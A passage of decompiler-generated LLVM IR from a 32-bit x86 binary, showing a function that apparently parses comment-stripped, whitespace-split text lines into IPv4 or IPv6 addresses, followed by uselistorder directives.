  br i1 %tmp144, label %dec_label_pc_80525b5, label %dec_label_pc_805238a

dec_label_pc_805238a:                             ; preds = %dec_label_pc_8052381
  %v0_805238a = call i32 @function_80522bc()
  store i32 %v0_805238a, i32* %eax.global-to-local, align 4
  %v1_805238f = icmp eq i32 %v0_805238a, 0
  br i1 %v1_805238f, label %dec_label_pc_80523b7, label %dec_label_pc_8052397

dec_label_pc_8052397:                             ; preds = %dec_label_pc_805238a
  store i32 %v1_805231f, i32* %edx.global-to-local, align 4
  store i32 %v1_8052363, i32* %eax.global-to-local, align 4
  %v0_805239f = load i32, i32* @edi, align 4
  %v0_80523a3 = load i32, i32* @esi, align 4
  %v4_80523a7 = inttoptr i32 %v1_805231f to i8*
  br label %dec_label_pc_8052465

dec_label_pc_80523b7:                             ; preds = %dec_label_pc_805238a
  store i32 %arg8, i32* %edx.global-to-local, align 4
  %v1_80523bb = inttoptr i32 %arg8 to i32*
  store i32 0, i32* %v1_80523bb, align 4
  %v1_80523c1 = call i32 @function_804baa4(i32 0)
  store i32 %v1_80523c1, i32* %eax.global-to-local, align 4
  %v1_80523c6 = inttoptr i32 %v1_80523c1 to i32*
  %v2_80523c6 = load i32, i32* %v1_80523c6, align 4
  store i32 %v2_80523c6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80525b5

dec_label_pc_80523d1:                             ; preds = %dec_label_pc_8052538
  %v2_80523d1 = load i8*, i8** %stack_var_-44, align 4
  %v3_80523d1 = ptrtoint i8* %v2_80523d1 to i32
  store i32 %v3_80523d1, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-40.0, i32* %eax.global-to-local, align 4
  %v2_80523d8 = inttoptr i32 %stack_var_-40.0 to i32*
  store i32 %v3_80523d1, i32* %v2_80523d8, align 4
  %v0_80523da = load i32, i32* %eax.global-to-local, align 4
  %v1_80523da = add i32 %v0_80523da, 4
  %v2_80523da = inttoptr i32 %v1_80523da to i32*
  store i32 0, i32* %v2_80523da, align 4
  %v0_80523e1 = load i32, i32* @ebx, align 4
  %v1_80523e1 = add i32 %v0_80523e1, 4
  %v2_80523e1 = inttoptr i32 %v1_80523e1 to i32*
  %v3_80523e1 = load i32, i32* %v2_80523e1, align 4
  store i32 %v3_80523e1, i32* %eax.global-to-local, align 4
  store i32 %tmp60, i32* %edx.global-to-local, align 4
  store i32 %v3_80523e1, i32* %arg5, align 4
  %v1_80523ea = add i32 %tmp60, 8
  %v2_80523ea = inttoptr i32 %v1_80523ea to i32*
  store i32 2, i32* %v2_80523ea, align 4
  %v0_80523f1 = load i32, i32* %edx.global-to-local, align 4
  %v1_80523f1 = add i32 %v0_80523f1, 12
  %v2_80523f1 = inttoptr i32 %v1_80523f1 to i32*
  store i32 4, i32* %v2_80523f1, align 4
  br label %dec_label_pc_805242a

dec_label_pc_80523fe:                             ; preds = %dec_label_pc_805255a
  store i32 %stack_var_-36.0, i32* %eax.global-to-local, align 4
  store i32 %storemerge3, i32* %edx.global-to-local, align 4
  %v2_8052406 = inttoptr i32 %storemerge3 to i32*
  store i32 %stack_var_-36.0, i32* %v2_8052406, align 4
  %v0_8052408 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052408 = add i32 %v0_8052408, 4
  %v2_8052408 = inttoptr i32 %v1_8052408 to i32*
  store i32 0, i32* %v2_8052408, align 4
  %v0_805240f = load i32, i32* @ebx, align 4
  %v1_805240f = add i32 %v0_805240f, 4
  %v2_805240f = inttoptr i32 %v1_805240f to i32*
  %v3_805240f = load i32, i32* %v2_805240f, align 4
  store i32 %v3_805240f, i32* %eax.global-to-local, align 4
  store i32 %tmp60, i32* %edx.global-to-local, align 4
  store i32 %v3_805240f, i32* %arg5, align 4
  %v1_8052418 = add i32 %tmp60, 8
  %v2_8052418 = inttoptr i32 %v1_8052418 to i32*
  store i32 10, i32* %v2_8052418, align 4
  %v0_805241f = load i32, i32* %edx.global-to-local, align 4
  %v1_805241f = add i32 %v0_805241f, 12
  %v2_805241f = inttoptr i32 %v1_805241f to i32*
  store i32 16, i32* %v2_805241f, align 4
  br label %dec_label_pc_805242a

dec_label_pc_805242a:                             ; preds = %dec_label_pc_80523d1, %dec_label_pc_80523fe
  %storemerge = phi i32 [ %stack_var_-40.0, %dec_label_pc_80523d1 ], [ %storemerge3, %dec_label_pc_80523fe ]
  %v1_805242a = load i32, i32* %edx.global-to-local, align 4
  %v2_805242a = add i32 %v1_805242a, 16
  %v3_805242a = inttoptr i32 %v2_805242a to i32*
  store i32 %storemerge, i32* %v3_805242a, align 4
  %v0_805242d = load i32, i32* @ebx, align 4
  %v1_805242d = add i32 %v0_805242d, 8
  %v1_8052430 = load i32, i32* %edx.global-to-local, align 4
  %v2_8052430 = add i32 %v1_8052430, 4
  %v3_8052430 = inttoptr i32 %v2_8052430 to i32*
  store i32 %v1_805242d, i32* %v3_8052430, align 4
  store i32 %arg8, i32* @eax, align 4
  %v0_8052437 = load i32, i32* %edx.global-to-local, align 4
  %v2_8052437 = inttoptr i32 %arg8 to i32*
  store i32 %v0_8052437, i32* %v2_8052437, align 4
  br label %dec_label_pc_8052595

dec_label_pc_8052465:                             ; preds = %dec_label_pc_805231a.dec_label_pc_8052465_crit_edge, %dec_label_pc_8052397
  %v1_8052469.pre-phi = phi i32* [ %.pre, %dec_label_pc_805231a.dec_label_pc_8052465_crit_edge ], [ %v1_8052336, %dec_label_pc_8052397 ]
  %storemerge4 = phi i8* [ null, %dec_label_pc_805231a.dec_label_pc_8052465_crit_edge ], [ %v4_80523a7, %dec_label_pc_8052397 ]
  %stack_var_-20.0.in = phi i32 [ %v1_805231f, %dec_label_pc_805231a.dec_label_pc_8052465_crit_edge ], [ %v0_80523a3, %dec_label_pc_8052397 ]
  %stack_var_-36.0 = phi i32 [ 0, %dec_label_pc_805231a.dec_label_pc_8052465_crit_edge ], [ %v1_805231f, %dec_label_pc_8052397 ]
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_805231a.dec_label_pc_8052465_crit_edge ], [ %v0_805239f, %dec_label_pc_8052397 ]
  %stack_var_4.0 = phi i32 [ %arg1, %dec_label_pc_805231a.dec_label_pc_8052465_crit_edge ], [ %v0_805238a, %dec_label_pc_8052397 ]
  %storemerge3 = phi i32 [ 0, %dec_label_pc_805231a.dec_label_pc_8052465_crit_edge ], [ %v1_8052363, %dec_label_pc_8052397 ]
  store i8* %storemerge4, i8** %stack_var_-44, align 4
  %stack_var_-20.0 = inttoptr i32 %stack_var_-20.0.in to i8*
  store i32 %arg9, i32* @edx, align 4
  store i32 1, i32* %v1_8052469.pre-phi, align 4
  %v12_80524f3 = icmp eq i32 %arg4, 2
  %v2_805251e = inttoptr i32 %arg2 to i8*
  %v12_8052531 = icmp eq i32 %arg3, 2
  %v12_8052553 = icmp eq i32 %arg3, 10
  %v1_80524fd = icmp eq i1 %v12_80524f3, false
  %v1_8052536 = icmp eq i1 %v12_8052531, false
  %v1_8052558 = icmp eq i1 %v12_8052553, false
  br label %dec_label_pc_805257b.outer

dec_label_pc_805257b.outer:                       ; preds = %dec_label_pc_8052553, %dec_label_pc_805255a, %dec_label_pc_8052538, %dec_label_pc_8052465
  %stack_var_-28.0.ph = phi i32 [ 1, %dec_label_pc_8052465 ], [ 2, %dec_label_pc_8052538 ], [ 2, %dec_label_pc_805255a ], [ 2, %dec_label_pc_8052553 ]
  br label %dec_label_pc_805257b

dec_label_pc_805247c:                             ; preds = %dec_label_pc_805257b
  %v5_8052484 = call i32 @function_8052674(i8* %stack_var_-20.0, i32 35, i32 %v3_8052585, i32 %v3_8052585)
  store i32 %v5_8052484, i32* @eax, align 4
  %v1_805248c = icmp eq i32 %v5_8052484, 0
  br i1 %v1_805248c, label %dec_label_pc_8052493, label %dec_label_pc_8052490

dec_label_pc_8052490:                             ; preds = %dec_label_pc_805247c
  %v1_8052490 = inttoptr i32 %v5_8052484 to i8*
  store i8 0, i8* %v1_8052490, align 1
  br label %dec_label_pc_8052493

dec_label_pc_8052493:                             ; preds = %dec_label_pc_805247c, %dec_label_pc_8052490
  store i32 %stack_var_-20.0.in, i32* @ecx, align 4
  store i32 0, i32* @edi, align 4
  %v2_80524d334 = load i8, i8* %stack_var_-20.0, align 1
  %v3_80524d335 = icmp eq i8 %v2_80524d334, 0
  %v1_80524d641 = icmp eq i1 %v3_80524d335, false
  br i1 %v1_80524d641, label %dec_label_pc_805249f.preheader.preheader, label %dec_label_pc_80524d8

dec_label_pc_805249f.preheader.preheader:         ; preds = %dec_label_pc_8052493
  %v4_805249f98.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_805249f.preheader

dec_label_pc_805249b:                             ; preds = %dec_label_pc_80524a5
  store i8 0, i8* %v1_805249f104, align 1
  %v0_805249e = load i32, i32* @ecx, align 4
  %v1_805249e = add i32 %v0_805249e, 1
  store i32 %v1_805249e, i32* @ecx, align 4
  %v1_805249f = inttoptr i32 %v1_805249e to i8*
  %v2_805249f = load i8, i8* %v1_805249f, align 1
  %v3_805249f = zext i8 %v2_805249f to i32
  %v4_805249f = load i32, i32* %eax.global-to-local, align 4
  %v5_805249f = and i32 %v4_805249f, -256
  %v6_805249f = or i32 %v5_805249f, %v3_805249f
  store i32 %v6_805249f, i32* @eax, align 4
  %v4_80524a1 = icmp eq i8 %v2_805249f, 0
  br i1 %v4_80524a1, label %dec_label_pc_805249f.dec_label_pc_80524d8.loopexit_crit_edge, label %dec_label_pc_80524a5

dec_label_pc_80524a5:                             ; preds = %dec_label_pc_805249f.preheader, %dec_label_pc_805249b
  %v2_805249f105 = phi i8 [ %v2_805249f, %dec_label_pc_805249b ], [ %v2_805249f96, %dec_label_pc_805249f.preheader ]
  %v1_805249f104 = phi i8* [ %v1_805249f, %dec_label_pc_805249b ], [ %v1_805249f95, %dec_label_pc_805249f.preheader ]
  %v0_805249b103 = phi i32 [ %v1_805249e, %dec_label_pc_805249b ], [ %v0_805249f49, %dec_label_pc_805249f.preheader ]
  %v2_80524a5 = sext i8 %v2_805249f105 to i32
  store i32 %v2_80524a5, i32* @edx, align 4
  %v0_80524a8 = load i32, i32* @global_var_8056440, align 64
  store i32 %v0_80524a8, i32* %eax.global-to-local, align 4
  %v2_80524ad = mul nsw i32 %v2_80524a5, 2
  %v3_80524ad = add i32 %v0_80524a8, %v2_80524ad
  %v4_80524ad = inttoptr i32 %v3_80524ad to i8*
  %v5_80524ad = load i8, i8* %v4_80524ad, align 1
  %v6_80524ad = and i8 %v5_80524ad, 32
  %v7_80524ad = icmp eq i8 %v6_80524ad, 0
  %v1_80524b1 = icmp eq i1 %v7_80524ad, false
  br i1 %v1_80524b1, label %dec_label_pc_805249b, label %dec_label_pc_80524b3

dec_label_pc_80524b3:                             ; preds = %dec_label_pc_80524a5
  %v0_80524b3 = load i32, i32* @edi, align 4
  %v1_80524b3 = add i32 %v0_80524b3, -6
  %v6_80524b3 = sub i32 5, %v0_80524b3
  %v7_80524b3 = and i32 %v6_80524b3, %v0_80524b3
  %v8_80524b3 = icmp slt i32 %v7_80524b3, 0
  %v9_80524b3 = icmp eq i32 %v1_80524b3, 0
  %v10_80524b3 = icmp slt i32 %v1_80524b3, 0
  %v3_80524b6 = icmp eq i1 %v10_80524b3, %v8_80524b3
  %v4_80524b6 = icmp eq i1 %v9_80524b3, false
  %v5_80524b6 = and i1 %v4_80524b6, %v3_80524b6
  br i1 %v5_80524b6, label %dec_label_pc_80524bf.preheader, label %dec_label_pc_80524b8

dec_label_pc_80524b8:                             ; preds = %dec_label_pc_80524b3
  %v1_80524b8 = load i32, i32* @ebx, align 4
  %v3_80524b8 = mul i32 %v0_80524b3, 4
  %v4_80524b8 = add i32 %v1_80524b8, %v3_80524b8
  %v5_80524b8 = inttoptr i32 %v4_80524b8 to i32*
  store i32 %v0_805249b103, i32* %v5_80524b8, align 4
  %v0_80524bb = load i32, i32* @edi, align 4
  %v1_80524bb = add i32 %v0_80524bb, 1
  store i32 %v1_80524bb, i32* @edi, align 4
  %v0_80524bf.pre.pre = load i32, i32* @ecx, align 4
  %v4_80524bf.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80524bf.preheader

dec_label_pc_80524bf.preheader:                   ; preds = %dec_label_pc_80524b8, %dec_label_pc_80524b3
  %v4_80524bf.pre = phi i32 [ %v4_80524bf.pre.pre, %dec_label_pc_80524b8 ], [ %v0_80524a8, %dec_label_pc_80524b3 ]
  %v0_80524bf.pre = phi i32 [ %v0_80524bf.pre.pre, %dec_label_pc_80524b8 ], [ %v0_805249b103, %dec_label_pc_80524b3 ]
  %v0_80524d854 = phi i32 [ %v1_80524bb, %dec_label_pc_80524b8 ], [ %v0_80524b3, %dec_label_pc_80524b3 ]
  %v1_80524bf106 = inttoptr i32 %v0_80524bf.pre to i8*
  %v2_80524bf107 = load i8, i8* %v1_80524bf106, align 1
  %v3_80524bf108 = zext i8 %v2_80524bf107 to i32
  %v5_80524bf109 = and i32 %v4_80524bf.pre, -256
  %v6_80524bf110 = or i32 %v3_80524bf108, %v5_80524bf109
  store i32 %v6_80524bf110, i32* @eax, align 4
  %v4_80524c1111 = icmp eq i8 %v2_80524bf107, 0
  br i1 %v4_80524c1111, label %dec_label_pc_80524d3.loopexit, label %dec_label_pc_80524c5.lr.ph

dec_label_pc_80524c5.lr.ph:                       ; preds = %dec_label_pc_80524bf.preheader
  %v0_80524c8.pre = load i32, i32* @global_var_8056440, align 64
  br label %dec_label_pc_80524c5

dec_label_pc_80524be:                             ; preds = %dec_label_pc_80524c5
  %v1_80524be = add i32 %v0_80524d3113, 1
  store i32 %v1_80524be, i32* @ecx, align 4
  %v1_80524bf = inttoptr i32 %v1_80524be to i8*
  %v2_80524bf = load i8, i8* %v1_80524bf, align 1
  %v3_80524bf = zext i8 %v2_80524bf to i32
  %v5_80524bf = and i32 %v0_80524c8.pre, -256
  %v6_80524bf = or i32 %v3_80524bf, %v5_80524bf
  store i32 %v6_80524bf, i32* @eax, align 4
  %v4_80524c1 = icmp eq i8 %v2_80524bf, 0
  br i1 %v4_80524c1, label %dec_label_pc_80524d3.loopexit, label %dec_label_pc_80524c5

dec_label_pc_80524c5:                             ; preds = %dec_label_pc_80524c5.lr.ph, %dec_label_pc_80524be
  %v2_80524bf115 = phi i8 [ %v2_80524bf107, %dec_label_pc_80524c5.lr.ph ], [ %v2_80524bf, %dec_label_pc_80524be ]
  %v1_80524bf114 = phi i8* [ %v1_80524bf106, %dec_label_pc_80524c5.lr.ph ], [ %v1_80524bf, %dec_label_pc_80524be ]
  %v0_80524d3113 = phi i32 [ %v0_80524bf.pre, %dec_label_pc_80524c5.lr.ph ], [ %v1_80524be, %dec_label_pc_80524be ]
  %v2_80524c5 = sext i8 %v2_80524bf115 to i32
  store i32 %v2_80524c5, i32* @edx, align 4
  store i32 %v0_80524c8.pre, i32* @eax, align 4
  %v2_80524cd = mul nsw i32 %v2_80524c5, 2
  %v3_80524cd = add i32 %v0_80524c8.pre, %v2_80524cd
  %v4_80524cd = inttoptr i32 %v3_80524cd to i8*
  %v5_80524cd = load i8, i8* %v4_80524cd, align 1
  %v6_80524cd = and i8 %v5_80524cd, 32
  %v7_80524cd = icmp eq i8 %v6_80524cd, 0
  br i1 %v7_80524cd, label %dec_label_pc_80524be, label %dec_label_pc_80524d3.loopexit

dec_label_pc_80524d3.loopexit:                    ; preds = %dec_label_pc_80524c5, %dec_label_pc_80524be, %dec_label_pc_80524bf.preheader
  %v4_805249f98135 = phi i32 [ %v6_80524bf110, %dec_label_pc_80524bf.preheader ], [ %v6_80524bf, %dec_label_pc_80524be ], [ %v0_80524c8.pre, %dec_label_pc_80524c5 ]
  %v0_80524d3.lcssa = phi i32 [ %v0_80524bf.pre, %dec_label_pc_80524bf.preheader ], [ %v1_80524be, %dec_label_pc_80524be ], [ %v0_80524d3113, %dec_label_pc_80524c5 ]
  %v1_80524bf.lcssa = phi i8* [ %v1_80524bf106, %dec_label_pc_80524bf.preheader ], [ %v1_80524bf, %dec_label_pc_80524be ], [ %v1_80524bf114, %dec_label_pc_80524c5 ]
  %v2_80524d3 = load i8, i8* %v1_80524bf.lcssa, align 1
  %v3_80524d3 = icmp eq i8 %v2_80524d3, 0
  %v1_80524d6 = icmp eq i1 %v3_80524d3, false
  br i1 %v1_80524d6, label %dec_label_pc_805249f.preheader, label %dec_label_pc_80524d8

dec_label_pc_805249f.preheader:                   ; preds = %dec_label_pc_805249f.preheader.preheader, %dec_label_pc_80524d3.loopexit
  %v0_80524d8.pre138 = phi i32 [ %v0_80524d854, %dec_label_pc_80524d3.loopexit ], [ 0, %dec_label_pc_805249f.preheader.preheader ]
  %v4_805249f98 = phi i32 [ %v4_805249f98135, %dec_label_pc_80524d3.loopexit ], [ %v4_805249f98.pre, %dec_label_pc_805249f.preheader.preheader ]
  %v0_805249f49 = phi i32 [ %v0_80524d3.lcssa, %dec_label_pc_80524d3.loopexit ], [ %stack_var_-20.0.in, %dec_label_pc_805249f.preheader.preheader ]
  %v1_805249f95 = inttoptr i32 %v0_805249f49 to i8*
  %v2_805249f96 = load i8, i8* %v1_805249f95, align 1
  %v3_805249f97 = zext i8 %v2_805249f96 to i32
  %v5_805249f99 = and i32 %v4_805249f98, -256
  %v6_805249f100 = or i32 %v5_805249f99, %v3_805249f97
  store i32 %v6_805249f100, i32* @eax, align 4
  %v4_80524a1101 = icmp eq i8 %v2_805249f96, 0
  br i1 %v4_80524a1101, label %dec_label_pc_80524d8, label %dec_label_pc_80524a5

dec_label_pc_805249f.dec_label_pc_80524d8.loopexit_crit_edge: ; preds = %dec_label_pc_805249b
  %v0_80524d8.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80524d8

dec_label_pc_80524d8:                             ; preds = %dec_label_pc_80524d3.loopexit, %dec_label_pc_805249f.dec_label_pc_80524d8.loopexit_crit_edge, %dec_label_pc_805249f.preheader, %dec_label_pc_8052493
  %v1_80524db = phi i32 [ 0, %dec_label_pc_8052493 ], [ %v0_80524d8.pre.pre, %dec_label_pc_805249f.dec_label_pc_80524d8.loopexit_crit_edge ], [ %v0_80524d8.pre138, %dec_label_pc_805249f.preheader ], [ %v0_80524d854, %dec_label_pc_80524d3.loopexit ]
  %v0_80524db = load i32, i32* @ebx, align 4
  %v2_80524db = mul i32 %v1_80524db, 4
  %v3_80524db = add i32 %v0_80524db, %v2_80524db
  %v4_80524db = inttoptr i32 %v3_80524db to i32*
  store i32 0, i32* %v4_80524db, align 4
  %v7_80524e2 = icmp sgt i32 %v1_80524db, 1
  br i1 %v7_80524e2, label %dec_label_pc_80524e8, label %dec_label_pc_805257b

dec_label_pc_80524e8:                             ; preds = %dec_label_pc_80524d8
  br i1 %v12_805231a, label %dec_label_pc_80525b5, label %dec_label_pc_80524f3

dec_label_pc_80524f3:                             ; preds = %dec_label_pc_80524e8
  store i32 1, i32* @esi, align 4
  br i1 %v1_80524fd, label %dec_label_pc_805252b.preheader, label %dec_label_pc_80524ff

dec_label_pc_805252b.preheader:                   ; preds = %dec_label_pc_80524f3
  %v1_805252b119 = load i32, i32* @edi, align 4
  %v5_805252d124 = icmp sgt i32 %v1_805252b119, 1
  br i1 %v5_805252d124, label %dec_label_pc_8052515.lr.ph, label %dec_label_pc_805257b

dec_label_pc_8052515.lr.ph:                       ; preds = %dec_label_pc_805252b.preheader
  br label %dec_label_pc_8052515

dec_label_pc_80524ff:                             ; preds = %dec_label_pc_80524f3
  %v0_80524ff = load i32, i32* @eax, align 4
  %v0_8052501 = load i32, i32* @ebx, align 4
  %v1_8052501 = inttoptr i32 %v0_8052501 to i32*
  %v2_8052501 = load i32, i32* %v1_8052501, align 4
  %v5_8052507 = call i32 @function_80519d8(i8* %v2_805251e, i32 %v2_8052501, i32 %v0_80524ff, i32 %v0_80524ff)
  store i32 %v5_8052507, i32* %eax.global-to-local, align 4
  %v1_805250f = icmp eq i32 %v5_8052507, 0
  %v1_8052511 = icmp eq i1 %v1_805250f, false
  br i1 %v1_8052511, label %dec_label_pc_805257b, label %dec_label_pc_8052531

dec_label_pc_8052515:                             ; preds = %dec_label_pc_8052515.lr.ph, %dec_label_pc_805252a
  %v1_8052517125 = phi i32 [ 1, %dec_label_pc_8052515.lr.ph ], [ %v1_805252a, %dec_label_pc_805252a ]
  %v0_8052517 = load i32, i32* @ebx, align 4
  %v2_8052517 = mul i32 %v1_8052517125, 4
  %v3_8052517 = add i32 %v0_8052517, %v2_8052517
  %v4_8052517 = inttoptr i32 %v3_8052517 to i32*
  %v5_8052517 = load i32, i32* %v4_8052517, align 4
  %v3_805251e = call i32 @function_804d65c(i8* %v2_805251e, i32 %v5_8052517)
  store i32 %v3_805251e, i32* %eax.global-to-local, align 4
  %v1_8052526 = icmp eq i32 %v3_805251e, 0
  br i1 %v1_8052526, label %dec_label_pc_8052531, label %dec_label_pc_805252a

dec_label_pc_805252a:                             ; preds = %dec_label_pc_8052515
  %v0_805252a = load i32, i32* @esi, align 4
  %v1_805252a = add i32 %v0_805252a, 1
  store i32 %v1_805252a, i32* @esi, align 4
  %v1_805252b = load i32, i32* @edi, align 4
  %v5_805252d = icmp slt i32 %v1_805252a, %v1_805252b
  br i1 %v5_805252d, label %dec_label_pc_8052515, label %dec_label_pc_805257b

dec_label_pc_8052531:                             ; preds = %dec_label_pc_80524ff, %dec_label_pc_8052515
  br i1 %v1_8052536, label %dec_label_pc_8052553, label %dec_label_pc_8052538

dec_label_pc_8052538:                             ; preds = %dec_label_pc_8052531
  %v0_8052538 = load i32, i32* @esi, align 4
  %v3_8052539 = load i8*, i8** %stack_var_-44, align 4
  %v4_8052539 = ptrtoint i8* %v3_8052539 to i32
  %v0_805253d = load i32, i32* @ebx, align 4
  %v1_805253d = inttoptr i32 %v0_805253d to i32*
  %v2_805253d = load i32, i32* %v1_805253d, align 4
  %v4_8052541 = inttoptr i32 %v2_805253d to i8*
  %v5_8052541 = call i32 @function_8051b46(i32 2, i8* %v4_8052541, i32 %v4_8052539, i32 %v0_8052538)
  store i32 %v5_8052541, i32* %eax.global-to-local, align 4
  %tmp85 = icmp slt i32 %v5_8052541, 1
  %tmp86 = icmp eq i1 %tmp85, false
  br i1 %tmp86, label %dec_label_pc_80523d1, label %dec_label_pc_805257b.outer

dec_label_pc_8052553:                             ; preds = %dec_label_pc_8052531
  br i1 %v1_8052558, label %dec_label_pc_805257b.outer, label %dec_label_pc_805255a

dec_label_pc_805255a:                             ; preds = %dec_label_pc_8052553
  %v0_805255a = load i32, i32* @ecx, align 4
  %v0_805255f = load i32, i32* @ebx, align 4
  %v1_805255f = inttoptr i32 %v0_805255f to i32*
  %v2_805255f = load i32, i32* %v1_805255f, align 4
  %v4_8052563 = inttoptr i32 %v2_805255f to i8*
  %v5_8052563 = call i32 @function_8051b46(i32 10, i8* %v4_8052563, i32 %stack_var_-36.0, i32 %v0_805255a)
  store i32 %v5_8052563, i32* %eax.global-to-local, align 4
  %tmp87 = icmp slt i32 %v5_8052563, 1
  %tmp88 = icmp eq i1 %tmp87, false
  br i1 %tmp88, label %dec_label_pc_80523fe, label %dec_label_pc_805257b.outer

dec_label_pc_805257b:                             ; preds = %dec_label_pc_805252b.preheader, %dec_label_pc_805252a, %dec_label_pc_80524d8, %dec_label_pc_80524ff, %dec_label_pc_805257b.outer
  %v0_805257b = load i32, i32* @edx, align 4
  %v3_8052585 = call i32 @function_804cf58(i32 %stack_var_-20.0.in, i32 %stack_var_4.0, i32 %v0_805257b)
  store i32 %v3_8052585, i32* @eax, align 4
  %v1_805258d = icmp eq i32 %v3_8052585, 0
  %v1_805258f = icmp eq i1 %v1_805258d, false
  br i1 %v1_805258f, label %dec_label_pc_805247c, label %dec_label_pc_8052595

dec_label_pc_8052595:                             ; preds = %dec_label_pc_805257b, %dec_label_pc_805242a
  %stack_var_-28.1 = phi i32 [ 0, %dec_label_pc_805242a ], [ %stack_var_-28.0.ph, %dec_label_pc_805257b ]
  br i1 %v12_805231a, label %dec_label_pc_80525b5, label %dec_label_pc_805259c

dec_label_pc_805259c:                             ; preds = %dec_label_pc_8052595
  %v1_80525a3 = inttoptr i32 %stack_var_4.0 to i16*
  %v2_80525a3 = call i32 @function_804baac(i16* %v1_80525a3)
  store i32 %v2_80525a3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80525b5

dec_label_pc_80525b5:                             ; preds = %dec_label_pc_80524e8, %dec_label_pc_8052305, %dec_label_pc_8052311, %dec_label_pc_805232f, %dec_label_pc_8052342, %dec_label_pc_805234e, %dec_label_pc_8052357, %dec_label_pc_8052381, %dec_label_pc_8052595, %dec_label_pc_805259c, %dec_label_pc_80523b7
  %stack_var_-28.2 = phi i32 [ %stack_var_-28.1, %dec_label_pc_8052595 ], [ %stack_var_-28.1, %dec_label_pc_805259c ], [ %v2_80523c6, %dec_label_pc_80523b7 ], [ 34, %dec_label_pc_8052381 ], [ 34, %dec_label_pc_8052357 ], [ 34, %dec_label_pc_805234e ], [ 34, %dec_label_pc_8052342 ], [ 34, %dec_label_pc_805232f ], [ 34, %dec_label_pc_8052311 ], [ 34, %dec_label_pc_8052305 ], [ %stack_var_-28.0.ph, %dec_label_pc_80524e8 ]
  store i32 %stack_var_-28.2, i32* %eax.global-to-local, align 4
  store i32 %v0_80522f0, i32* @ebx, align 4
  store i32 %v0_80522ef, i32* @esi, align 4
  store i32 %v0_80522ee, i32* @edi, align 4
  store i32 %v0_80522ed, i32* @ebp, align 4
  ret i32 %stack_var_-28.2

; uselistorder directives
  uselistorder i32 %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %v3_8052585, { 2, 3, 1, 0 }
  uselistorder i32 %v1_805252a, { 0, 2, 1 }
  uselistorder i32 %v1_80524db, { 1, 0 }
  uselistorder i8 %v2_805249f96, { 1, 2, 0 }
  uselistorder i8* %v1_805249f95, { 1, 0 }
  uselistorder i32 %v0_805249f49, { 1, 0 }
  uselistorder i32 %v2_80524c5, { 1, 0 }
  uselistorder i32 %v1_80524be, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80524c8.pre, { 0, 2, 3, 1 }
  uselistorder i32 %v1_80524b3, { 1, 0 }
  uselistorder i32 %v0_80524b3, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_80524a5, { 1, 0 }
  uselistorder i8* %v2_805251e, { 1, 0 }
  uselistorder i32 %storemerge3, { 1, 2, 0 }
  uselistorder i32 %stack_var_4.0, { 1, 0 }
  uselistorder i32 %stack_var_-40.0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-20.0.in, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8052363, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8052342, { 1, 0, 2, 3 }
  uselistorder i32 %v1_805231f, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_8052326, { 1, 0 }
  uselistorder i32 %v1_8052300, { 4, 3, 2, 1, 0 }
  uselistorder i8** %stack_var_-44, { 2, 0, 1 }
  uselistorder i32 %tmp60, { 0, 3, 1, 2 }
  uselistorder i32* %edx.global-to-local, { 4, 5, 6, 0, 1, 2, 3, 7, 8, 9, 10, 11, 13, 12, 14 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 4, 8, 9, 10, 11, 13, 12, 2, 3, 5, 6, 7, 14, 17, 15, 16, 18, 19, 20, 21, 22 }
  uselistorder i32 34, { 2, 3, 4, 5, 6, 7, 8, 10, 11, 12, 13, 9, 0, 1, 14, 15, 16 }
  uselistorder i32 (i16*)* @function_804baac, { 2, 3, 0, 1, 5, 4 }
  uselistorder i32 (i32, i32, i32)* @function_804cf58, { 3, 2, 1, 0 }
  uselistorder i32 (i8*, i32)* @function_804d65c, { 3, 0, 1, 2 }
  uselistorder i32 5, { 10, 13, 14, 15, 0, 9, 4, 5, 12, 6, 16, 17, 7, 2, 3, 18, 11, 19, 20, 8, 1 }
  uselistorder i32 -6, { 1, 0, 2 }
  uselistorder i8 32, { 10, 11, 12, 13, 14, 18, 0, 5, 19, 7, 8, 9, 6, 15, 20, 21, 16, 17, 1, 2, 3, 4 }
  uselistorder i32* @global_var_8056440, { 0, 4, 2, 5, 1, 3, 6, 7 }
  uselistorder i32 10, { 14, 0, 23, 24, 25, 26, 27, 28, 1, 11, 15, 2, 7, 29, 8, 9, 10, 16, 3, 19, 20, 21, 12, 30, 17, 13, 4, 5, 6, 22, 18 }
  uselistorder i32 12, { 43, 44, 45, 0, 46, 17, 26, 1, 53, 58, 21, 20, 7, 6, 8, 9, 10, 11, 12, 13, 14, 54, 92, 93, 94, 95, 96, 97, 98, 99, 2, 18, 19, 100, 101, 102, 107, 25, 27, 38, 57, 28, 29, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 30, 31, 32, 33, 34, 35, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 22, 91, 47, 48, 49, 50, 108, 51, 103, 3, 4, 104, 105, 15, 16, 106, 5, 55, 56, 23, 24, 36, 37, 39, 40, 41, 42, 52 }
  uselistorder i32 80, { 0, 5, 6, 7, 8, 9, 10, 11, 1, 2, 4, 3 }
  uselistorder i32 56, { 4, 15, 5, 0, 6, 7, 8, 9, 2, 11, 10, 12, 3, 1, 16, 13, 14 }
  uselistorder i32 44, { 4, 5, 6, 2, 0, 16, 17, 18, 7, 1, 13, 15, 14, 10, 11, 12, 8, 9, 3 }
  uselistorder i32 36, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 0, 13, 1, 2, 14, 15, 3, 16, 17, 18, 19 }
  uselistorder i32 -44, { 1, 0 }
  uselistorder i32 48, { 9, 10, 11, 0, 7, 4, 1, 8, 5, 6, 13, 14, 15, 16, 3, 2, 12 }
  uselistorder i32 -48, { 1, 2, 3, 0, 4 }
